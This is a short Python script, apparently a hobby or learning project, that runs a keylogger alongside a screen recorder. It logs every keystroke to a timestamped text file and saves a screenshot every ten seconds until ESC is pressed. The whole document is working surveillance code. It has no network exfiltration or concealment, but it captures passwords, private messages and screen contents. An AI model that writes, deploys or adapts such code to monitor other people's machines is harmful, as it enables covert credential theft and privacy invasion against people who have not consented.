from pynput.keyboard import Key, Listener
import pyautogui
import threading
import time
import os
import logging
from datetime import datetime

# === Timestamped Folder Setup ===
timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
folder_name = f"logs_{timestamp}"
os.makedirs(folder_name, exist_ok=True)

# === Logging Setup ===
log_file_path = os.path.join(folder_name, "keystrokes.txt")
logging.basicConfig(filename=log_file_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# === Stop Flag ===
stop_event = threading.Event()

# === Keystroke Logging Function ===
def press_key(key):
    try:
        logging.info(str(key))
    except:
        logging.info("Special Key Pressed")

def release_key(key):
    if key == Key.esc:
        stop_event.set()  # Signal to stop
        return False      # Stop keylogger

def keylogger():
    with Listener(on_press=press_key, on_release=release_key) as listener:
        listener.join()

# === Screenshot Capture Function ===
def screenshot_capture(interval=10):  # Take screenshot every 10 seconds
    count = 0
    while not stop_event.is_set():
        screenshot = pyautogui.screenshot()
        file_path = os.path.join(folder_name, f"screenshot_{count}.png")
        screenshot.save(file_path)
        count += 1
        time.sleep(interval)

# === Threading Setup ===
t1 = threading.Thread(target=keylogger)
t2 = threading.Thread(target=screenshot_capture)

print("Started Keylogger with Screenshot Capture... (Press ESC to stop)")
t1.start()
t2.start()

# Wait for both threads to finish
t1.join()
t2.join()

print("Keylogger and Screenshot capture stopped.")
